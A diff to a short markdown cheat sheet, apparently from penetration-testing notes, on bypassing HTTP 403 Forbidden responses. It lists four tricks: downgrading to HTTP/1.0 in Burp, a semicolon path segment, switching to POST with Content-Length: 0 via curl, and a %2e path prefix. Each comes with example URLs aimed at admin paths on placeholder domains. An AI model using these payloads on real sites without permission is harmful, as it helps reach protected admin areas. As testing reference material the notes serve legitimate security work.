@@ -1,11 +1,14 @@
 # 403 Forbidden Bypasses
 
-- Downgrade HTTP Protocol Version
-- Semicolon Bypass (;)
+- HTTP protocol version downgrade
+- Semicolon bypass (;)
+- Modify the request method and content length
+- Append characters
 
 ---
-### Downgrade HTTP Protocol Version
+### HTTP Protocol Version Downgrade
 
+Method:
   - Capture the request in BurpSuite - Send to Repeater
   - Change the http protocol version from **1.1** to **1.0** and clear all the other headers from the request
   - Forward the request to the Server
@@ -13,13 +16,37 @@
 ---
 ### Semicolon Bypass (;)
 
-Forbidden:
+Method:
+Blocked (403 Forbidden):
 ```CSS
 https://www.hackme.in/admin
 ```
-Bypassed:
+Bypassed (200 OK):
 ```CSS
 https://www.hackme.in/;/admin
 https://www.hackme.in/;/admin/config/listConfiguration
+```
+---
+### Modify the Request Method and Content Length
+
+Method:
+  - GET => POST
+	- Content-Length: 0
+```
+curl -X POST https://domain.com/admin -H "Content-Length: 0"
+```
+---
+### Append Characters
+
+Method:
+  - Append `%2e` before the directory/ file name
+
+Blocked (403 Forbidden):
+```
+https://domain.com/admin
+```
+Bypassed (200 OK):
+```
+https://domain.com/%2e/admin
 ```
 ---
